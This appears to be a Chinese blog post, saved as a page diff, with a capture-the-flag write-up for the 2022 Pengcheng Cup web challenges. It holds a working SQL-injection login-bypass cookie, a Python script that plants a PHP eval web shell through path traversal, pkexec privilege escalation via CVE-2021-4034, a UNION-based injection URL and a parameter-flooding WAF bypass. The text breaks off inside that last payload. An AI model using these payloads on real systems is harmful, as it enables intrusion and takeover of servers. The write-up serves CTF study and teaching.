@@ -1,0 +1,1192 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Arcticsea">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Arcticsea">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="ctf teclo blog">
+    <meta name="description" content="BY 恒星实验室高手高手高高手 (yu22x)扫描后台发现存在.git，利用githack工具拿到 .git 文件夹，利用 git log 查看 commit id，利用 git reset –hard be50c81b903b0005d0740d221e74c51340251bc2 进行恢复拿到源码。 通过后台扫描还发现存在login.php 根据底部信息获取到了cms类型以及版本号，直接网上搜">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022鹏城杯web">
+<meta property="og:url" content="https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/index.html">
+<meta property="og:site_name" content="北极海的博客空间">
+<meta property="og:description" content="BY 恒星实验室高手高手高高手 (yu22x)扫描后台发现存在.git，利用githack工具拿到 .git 文件夹，利用 git log 查看 commit id，利用 git reset –hard be50c81b903b0005d0740d221e74c51340251bc2 进行恢复拿到源码。 通过后台扫描还发现存在login.php 根据底部信息获取到了cms类型以及版本号，直接网上搜">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6c5bf48b38d14e06bad3a4e65b6920c8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/35dbcf739e3c412b80e44aa0d2ce1c9e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d37070300c914c32ad1cccfef418c7e1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6d46cd452c9d42749ef08ebac3968f2e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/179005a01e7b4dd5a06ef260ce35d3f0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5f822fc285f04f079f93441bdbdd189d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/769d4e9a4ccd434397a2163693f50f60.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8a2b8a43f025419e91a4ae43324224e7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e9260e48c1184f21b5b2afab6bb7d8d6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0ecf373ec94a4c54a7bfc116f29bd99b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/872fc9c16e7945b19b201fd8c005438a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/957c01aea0f3454ab5a0b18308998cb8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/aa91c328837a4fec966d69e13399a3a2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/199105972d7446a8871cd96428aebdfd.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/58cfb24f5dce4667a701d73d3a4ec244.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a7dd22dad61a4184b073fd84d7f9b74b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a2e1f1bbc3bb46f1a80a3ba68495d401.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7cbf495615944cf3afa0c2326716ca47.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/496728cf6b5e4859b881a3bdac7fc523.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/54667e18bd254e3ba8495678382ddfce.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/349d39ba41c04ccfb126312e917b707b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ef8313202716436db7ffdb3ba9af249a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a0405132f84c48d3b1a79dca7f752e6e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/67b57d1e076b42a5b5448d39acf69e4b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c064023fa41045c0907f7032b69fc175.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5b2b97fb4d0240e69e4445d47869c186.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bd522c23b9b44f908e5c550c234f4383.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a19400f4d43c4b339cd066a8e558b721.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4a4e025dc69c494fbc0b32bf4428ee53.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cc2a0aced10e44ba84e124d1cde7a6e1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/675d808f9a7940c09dac99e0b3aca097.png">
+<meta property="article:published_time" content="2022-09-09T16:28:27.555Z">
+<meta property="article:modified_time" content="2022-09-09T16:37:00.576Z">
+<meta property="article:author" content="Arcticsea">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP反序列化">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/6c5bf48b38d14e06bad3a4e65b6920c8.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>2022鹏城杯web · arcticsea的博客空间</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="北极海的博客空间" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>arcticsea's blog zone</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">arcticsea&#39;s blog zone</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">2022鹏城杯web</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                2022鹏城杯web
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="PHP反序列化">PHP反序列化</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.5k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/09/10</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="BY-恒星实验室"><a href="#BY-恒星实验室" class="headerlink" title="BY 恒星实验室"></a>BY 恒星实验室</h1><h2 id="高手高手高高手-yu22x"><a href="#高手高手高高手-yu22x" class="headerlink" title="高手高手高高手 (yu22x)"></a>高手高手高高手 (yu22x)</h2><p>扫描后台发现存在.git，利用githack工具拿到 .git 文件夹，利用 git log 查看 commit id，利用 git reset –hard be50c81b903b0005d0740d221e74c51340251bc2 进行恢复拿到源码。<br><img src="https://img-blog.csdnimg.cn/6c5bf48b38d14e06bad3a4e65b6920c8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/35dbcf739e3c412b80e44aa0d2ce1c9e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d37070300c914c32ad1cccfef418c7e1.png" alt="在这里插入图片描述"></p>
+<p>通过后台扫描还发现存在login.php<br><img src="https://img-blog.csdnimg.cn/6d46cd452c9d42749ef08ebac3968f2e.png" alt="在这里插入图片描述"></p>
+<p>根据底部信息获取到了cms类型以及版本号，直接网上搜相对应的漏洞。<br><img src="https://img-blog.csdnimg.cn/179005a01e7b4dd5a06ef260ce35d3f0.png" alt="在这里插入图片描述"></p>
+<p>发现了这么一条，说在login.php中存在sql注入漏洞。不过没有给poc。<br>但是可以根据产商给的补丁进行分析<br><img src="https://img-blog.csdnimg.cn/5f822fc285f04f079f93441bdbdd189d.png" alt="在这里插入图片描述"></p>
+<p>其中对login.php的改动主要内容如下<br><img src="https://img-blog.csdnimg.cn/769d4e9a4ccd434397a2163693f50f60.png" alt="在这里插入图片描述"></p>
+<p>更换了一条代码，其中第三个参数由原来的可控值改成了固定值，并且增加了第四个参数。<br>跟进protect函数。<br><img src="https://img-blog.csdnimg.cn/8a2b8a43f025419e91a4ae43324224e7.png" alt="在这里插入图片描述"></p>
+<p>接着跟进<code>$DB-&gt;protect</code><br><img src="https://img-blog.csdnimg.cn/e9260e48c1184f21b5b2afab6bb7d8d6.png" alt="在这里插入图片描述"></p>
+<p>对于我们来说的影响只有一条，就是会将单引号前面增加反斜杠。<br>跟进query_single<br><img src="https://img-blog.csdnimg.cn/0ecf373ec94a4c54a7bfc116f29bd99b.png" alt="在这里插入图片描述"></p>
+<p>最主要的是进行了查询语句，并且查询语句中的<code>$where</code>是可控的，也就是<br><code>&#39;cookie_hash = &#39;.protect($_COOKIE[&#39;navigate-user&#39;])</code><br>并且查询成功会跳转到首页（相当于登录成功）<br><img src="https://img-blog.csdnimg.cn/872fc9c16e7945b19b201fd8c005438a.png" alt="在这里插入图片描述"></p>
+<p>将代码简单整理下，大致过程如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">protect</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>.<span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">            <span class="variable">$str</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$column</span>=<span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="variable">$table</span>=<span class="string">&#x27;nv_users&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$where</span>=<span class="string">&#x27;cookie_hash = &#x27;</span>.<span class="title function_ invoke__">protect</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&#x27;SELECT &#x27;</span> . <span class="variable">$column</span> . <span class="string">&#x27; FROM &#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27; WHERE &#x27;</span> . <span class="variable">$where</span> . <span class="variable">$order</span> . <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>; </span><br></pre></td></tr></table></figure>
+
+<p>剩下的就是怎么传cookie可以生成万能密码。<br>因为过滤会在单引号前面增加反斜杠，所以可以自己写个反斜杠则可以转移掉。<br><img src="https://img-blog.csdnimg.cn/957c01aea0f3454ab5a0b18308998cb8.png" alt="在这里插入图片描述"></p>
+<p>也就是cookie传入<code>navigate-user=\&#39;||1#</code> 即可登录成功。<br><img src="https://img-blog.csdnimg.cn/aa91c328837a4fec966d69e13399a3a2.png" alt="在这里插入图片描述"></p>
+<p>进入后台后，还是搜下历史漏洞，其中有个引起了我的注意。<br><img src="https://img-blog.csdnimg.cn/199105972d7446a8871cd96428aebdfd.png" alt="在这里插入图片描述"></p>
+<p>在navigate_upload.php中存在漏洞，接着继续看下补丁。<br><img src="https://img-blog.csdnimg.cn/58cfb24f5dce4667a701d73d3a4ec244.png" alt="在这里插入图片描述"></p>
+<p>补丁中将这一整个if全部删除了，看来漏洞点就是这个地方了。<br>并且git获取到的源码中也确实存在这段代码。<br>简答分析一下<br><img src="https://img-blog.csdnimg.cn/a7dd22dad61a4184b073fd84d7f9b74b.png" alt="在这里插入图片描述"></p>
+<p>可以将上传的文件写入，但是还要传个id，并且最终拼接成了路径是已存在的文件。<br>也就是说可以覆盖已有文件。<br>那么我们可以直接覆盖一个php文件。首页里面有个navigate_info.php貌似没什么用。就覆盖他了。<br>问题来了，对传入的id进行了替换，将…&#x2F;替换成了空。<br>不过不要紧，可以采用双写绕过的方式。<br>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">sess=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://192.168.1.116/&quot;</span></span><br><span class="line">r1=sess.get(url+<span class="string">&#x27;login.php&#x27;</span>,headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&quot;navigate-user=\\&#x27;||1#&quot;</span>&#125;)</span><br><span class="line">url=url+<span class="string">&quot;navigate_upload.php?session_id=31pukck2gfik0s84750cbvrdq2&amp;engine=picnik&amp;id=....//....//....//navigate_info.php&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">r=sess.post(url,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text) </span><br></pre></td></tr></table></figure>
+
+<p>通过蚁剑连接后发现没有flag文件，但是存在一个可执行文件。<br><img src="https://img-blog.csdnimg.cn/a2e1f1bbc3bb46f1a80a3ba68495d401.png" alt="在这里插入图片描述"></p>
+<p>执行后没有出flag。<br>打开这个文件看下。<br><img src="https://img-blog.csdnimg.cn/7cbf495615944cf3afa0c2326716ca47.png" alt="在这里插入图片描述"></p>
+<p>应该是需要删除掉网站根目录下的bocai.html、bocai.png，然后再来执行，不过暂时没有删除的权限，所以应该是需要提权了。</p>
+<p>利用 find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null 命令发现有 pkexec<br><img src="https://img-blog.csdnimg.cn/496728cf6b5e4859b881a3bdac7fc523.png" alt="在这里插入图片描述"></p>
+<p>直接用 CVE-2021-4034 进行提权<br><img src="https://img-blog.csdnimg.cn/54667e18bd254e3ba8495678382ddfce.png" alt="在这里插入图片描述"></p>
+<p>查看发现 bocai.html 和 bocai.png 不能删、不能移动，利用 chattr -a bocai* 命令去除该属性即可。<br><img src="https://img-blog.csdnimg.cn/349d39ba41c04ccfb126312e917b707b.png" alt="在这里插入图片描述"></p>
+<p>执行 .&#x2F;I_want_capture_the_flag 拿到 flag:<br><img src="https://img-blog.csdnimg.cn/ef8313202716436db7ffdb3ba9af249a.png" alt="在这里插入图片描述"></p>
+<h2 id="easygo-airrudder"><a href="#easygo-airrudder" class="headerlink" title="easygo (airrudder)"></a>easygo (airrudder)</h2><p>下载附件，是 go.mod，里面有个 github 地址<br><img src="https://img-blog.csdnimg.cn/a0405132f84c48d3b1a79dca7f752e6e.png" alt="在这里插入图片描述"></p>
+<p>查看发现就有利用方式<br><img src="https://img-blog.csdnimg.cn/67b57d1e076b42a5b5448d39acf69e4b.png" alt="在这里插入图片描述"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.115:8080/juice/1&#x27; UNION SELECT 1,flag FROM super_secret_table--+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/c064023fa41045c0907f7032b69fc175.png" alt="在这里插入图片描述"></p>
+<h2 id="简单包含-yu22x"><a href="#简单包含-yu22x" class="headerlink" title="简单包含 (yu22x)"></a>简单包含 (yu22x)</h2><p>正常提交伪协议发现存在waf<br><img src="https://img-blog.csdnimg.cn/5b2b97fb4d0240e69e4445d47869c186.png" alt="在这里插入图片描述"></p>
+<p>经过反复测试，提交一定数量的参数即可绕过<br>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1